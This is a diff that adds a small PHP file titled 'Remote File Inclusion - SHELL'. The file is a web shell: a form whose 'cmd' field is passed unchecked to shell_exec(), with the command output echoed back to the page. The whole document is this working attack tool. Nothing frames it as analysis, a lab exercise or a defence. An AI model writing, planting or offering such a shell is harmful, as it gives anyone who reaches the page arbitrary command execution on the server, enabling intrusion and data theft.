@@ -1,0 +1,21 @@
+<body>
+  <form action="<?php $link=(isset($_SERVER['HTTPS']) ? "https" : "http")."://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">
+    <center>
+      <br>
+      <h1> Remote File Inclusion - SHELL </h1>
+      <h2>
+        Command:
+        <input type="text" name="cmd" value=""/>
+        <input type="submit" name="submit" value="cmd">
+      </h2>
+    </center>
+  </form>
+
+  <?php
+    if(isset($_POST["cmd"])) {
+      $cmd = $_POST["cmd"];
+      $output = shell_exec("{$cmd}");
+      echo "<h2>".$cmd."</h2>"."<pre>".$output."</pre>";
+    }
+  ?>
+</body>
